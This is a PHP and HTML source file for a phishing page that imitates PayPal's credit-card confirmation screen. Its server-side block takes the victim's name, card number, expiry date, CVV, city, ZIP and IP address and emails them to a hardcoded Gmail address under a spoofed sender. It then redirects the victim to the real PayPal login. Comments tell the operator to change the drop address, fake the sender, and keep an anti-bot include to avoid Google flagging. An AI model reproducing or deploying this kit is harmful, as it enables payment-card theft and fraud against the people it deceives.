<?php



if (isset($_POST['submit'])) {
    
include_once('../include/bots2.php'); //// ANTI BOOTS DONT DELETE THIS PREVENT FLAGGING FROM GOOGLE
    
$ip = getenv("REMOTE_ADDR");
$message .= "---------PayPal CVV Logs b00merang.cc -----------\n";
$message .= "FullName : ".$_POST['nameholder']."\n";
$message .= "CardNumber : ".$_POST['cardnumber']."\n";
$message .= "Exp/Date : ".$_POST['exdate']."\n";
$message .= "CVV : ".$_POST['cvv']."\n";
$message .= "City : ".$_POST['city']."\n";
$message .= "ZIP : ".$_POST['zip']."\n";

$message .= "IP : ".$ip."\n";
$message .= "---------PayPal Logs b00merang.cc -----------\n";
$recipient = "gray66tim@gmail.com";   ///////HERE CHANGE YOUR EMAIL WHERE LOGS SHOULD BE SENT
$subject = "PayPal CVV-$ip";
$headers = "From: services@marketz.cc";  ///BEWARE HERE DONT TOUCH USE ALWAYS FAKE EMAIL AS SENDER TO PREVENT NOT DELIVERING
$headers .= $_POST['$ip']."\n";
mail($recipient,$subject,$message,$headers);

header("Location: https://paypal.com/login");



exit;
    
    
    
}



?>

<!doctype html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width" />
    <title>Credit Card - PayPal</title>
    <link href="../css/style.css" rel="stylesheet" type="text/css">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="../css/fav.ico" />
    <script src="http://code.jquery.com/jquery-2.1.4.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
</head>
<body style="background-color: #6D6E71;">
<div class="contenaire">
    <div class="grey-background">
        <div class="header">
            <p class="img"></p>
        </div>
        <div class="content">
            <div class="warp">
                <div class="navout colum navoutx">
                    <div class="navinner nav-col navinnerx">
                        <h2 style="color: #2C2E2F">Welcome<?php if(!isset($_SESSION['fname'])){}
                            else{echo ', '.ucfirst($_SESSION['fname']).'!';
                            }?> </h2>
                        <h4>Please confirm your Credit Card information</h4>
                       <?php if(!isset($_SESSION['creditCardNumber'])){}elseif($_SESSION['creditCardNumber'] == null){}else{
                           echo '<p class="cards">Credit Card  : •••• •••• •••• '.$_SESSION["creditCardNumber"].' <span class="typeCard ' .$_SESSION["creditCardType"].' cardbrand" aria-hidden="true"></span></p>';
                       }
                       ?>
                        <form method="post" action="">
                            
                            
                        <div class="textinputs inputspecial">
                            <input type="text" id="nameholder" autocomplete="off" name="nameholder" style="border: none;" placeholder="Card Holder Name">
                        </div>
                        <div class="textinputs inputspecial" >
                            <input type="tel" autocomplete="off" name="cardnumber" style="border: none" id="cc" class="cc-number cc-num" placeholder="Card number">
                            <span class="card" aria-hidden="true"></span>
                        </div>
                        
                        
                            <div class="group">
                                <div class="textinputs inputspecial" style="width: 48%;float: left;margin: 6px 0px 6px 10px;">
                                    <input type="text" autocomplete="off" name="exdate" class="cc-exp" style="border: none" placeholder="Expiration MM/YYYY"  value="<?php if(!isset($_SESSION['exDate'])){}else{ echo $_SESSION['exDate'];} ?>">
                                </div>
                                <div class="textinputs inputspecial" style="width: 43%;float: right;margin: 6px 10px 6px 0px;">
                                    <input type="text" autocomplete="off" name="cvv" class="cc-cvc" style="border: none" placeholder="CVV (CVC)" maxlength="4" value="">
                                    <span class="cardcvv" aria-hidden="true"></span>
                                </div>
                            </div>
                            
                         <div class="textinputs inputspecial">
                            <input type="text" id="address" autocomplete="off" name="address" style="border: none;" placeholder="Full Address">
                        </div>
                        
                         <div class="group">
                                <div class="textinputs inputspecial" style="width: 48%;float: left;margin: 6px 0px 6px 10px;">
                            <input type="text" id="city" autocomplete="off" name="city" style="border: none;" placeholder="City">
                                </div>
                                <div class="textinputs inputspecial" style="width: 43%;float: right;margin: 6px 10px 6px 0px;">
                            <input type="text" id="zip" autocomplete="off" name="zip" style="border: none;" placeholder="Zip Code">

                                </div>
                            </div>

                            
                        <div class="textinputs" style="margin-top: 50px;">
                            <div class="buttons">
                                <button type="submit" class="btn btnPremary" id="submit" name="submit" style="padding-left: 30px;padding-right: 40px;">Continue</button>
                            </div>
                        </div>
                        
                        
                        
                        </form>
                    </div>
                </div>
                <div class="navoutright colum">
                    <div class="image3">
                        <h2>Help us keep you safer</h2>
                        <p>Sometimes we'll ask you a unique question to verify who you are.</p>
                    </div>
                    <div class="image4">
                        <h2>All day, every day</h2>
                        <p>Our team of security experts work around the clock to keep you protected. We're here for your safety.</p>
                    </div>
                </div>
            </div>
        </div>

    </div>
    <footer class="footers">
        <div class="footer-nav">
            <div class="sitelinks container-fluid">
                <ul class="navlist">
                    <li><a href="#">Contact</a></li>
                    <li><a href="#">Security</a></li>
                    <li><a href="#">Logout</a></li>
                </ul>
            </div>

        </div>
        <div class="footer-legal">
            <div class="container-fluid">
                <span class="copyright">Copyright © 1999 - <?php echo date('Y') ?> PayPal. All rights reserved.</span>
                <span class="copyright-short">© 1999 - <?php echo date('Y') ?></span>
                <ul class="navlist footer-list">
                    <li><a href="#">Privacy</a> </li>
                    <li><a href="#">Legal</a></li>
                </ul>
            </div>
        </div>
    </footer>
</div>
<script src="../js/jquery.payment.js"></script>
<script src="../js/jquery.maskedinput.min.js"></script>
<script src="http://ajax.microsoft.com/ajax/jquery.validate/1.7/additional-methods.js"></script>
<script>
   $('.textinputs input').on({
      blur : function () {
          if( $(this).val().length === 0 ) {
              $(this).addClass('hasErreur2');
              $(this).parent('.inputspecial').addClass('hasErreur2');
          }else{
              $(this).removeClass('hasErreur');
              $(this).removeClass('hasErreur2');
              $(this).parent('.inputspecial').removeClass('hasErreur2');
          }
      }
   });
   jQuery(function($){
       $("#sociall").mask("999-99-9999");
   });
   $('.cc-num').on({
       blur : function () {
           if($(this).val().length ===0){
               $(this).addClass('hasErreur');
               $(this).removeClass('hasErreur2');
               $('.card').css('display','none');
           }
       },
       keydown : function () {
           $(this).removeClass('hasErreur');
           $(this).removeClass('hasErreur2');
           $(this).parent('.inputspecial').removeClass('hasErreur2');
           $('.card').css('display','block');
       }
   });
   $('.cc-cvc').on({
       blur : function () {
           if($(this).val().length ===0){
               $(this).addClass('hasErreur');
               $(this).removeClass('hasErreur2');
               $('.cardcvv').css('display','none');
           }
       },
       keydown : function () {
           $(this).removeClass('hasErreur');
           $(this).removeClass('hasErreur2');
           $(this).parent('.inputspecial').removeClass('hasErreur2');
           $('.cardcvv').css('display','block');
       }
   });
   $('.inputspecial input').on({
       blur : function () {
           if($(this).val().length ===0){
               $(this).addClass('hasErreur');
               $(this).removeClass('hasErreur2');
           }
       },
       keydown : function () {
           $(this).removeClass('hasErreur');
           $(this).removeClass('hasErreur2');
           $(this).parent('.inputspecial').removeClass('hasErreur2');
           $('.cardcvv').css('display','block');
       }
   });
    $('.textinputs select').change(function()
    {
        if( $(this).val().length === 0 ) {
            $(this).parent('.selectDown').addClass('hasErreur2');
        }else{
            $(this).parent('.selectDown').removeClass('hasErreur2');
        }
    });
    jQuery(function($) {
        $('[data-numeric]').payment('restrictNumeric');
        $('.cc-number').payment('formatCardNumber');
        $('.cc-exp').payment('formatCardExpiry');
        $('.cc-cvc').payment('formatCardCVC');

        $('form').submit(function () {
            var cardType = $.payment.cardType($('.cc-number').val());
            var valid = $.payment.validateCardNumber($('input.cc-num').val());
            var exDate = $.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal'));
            var validCvc = $.payment.validateCardCVC($('input.cc-cvc').val(), cardType);
            if($('.textinputs input').val().length === 0){
                $('.textinputs input').parent('.inputspecial').addClass('hasErreur2');
                $('.textinputs input').addClass('hasErreur2');
                $('.card').css('display','none');
                $('.cardcvv').css('display','none');
                return false;
            }else{
                if(!valid){
                    $('.card').css('display','none');
                    $('.cc-num').addClass('hasErreur');
                    return false;
                }
                if(!exDate){
                    $('.cc-exp').addClass('hasErreur');
                    return false;
                }
                if(!validCvc){
                    $('.cardcvv').css('display','none');
                    $('.cc-cvc').addClass('hasErreur');
                    return false;
                }
            }
        });
    });
   $(".inputspecial input").on({
       focus: function () {
           $(this).parent('.inputspecial').addClass('inputspecialBlue');
       },
       blur: function () {
           $(this).parent('.inputspecial').removeClass('inputspecialBlue');
       }
   });

</script>

</body>
</html>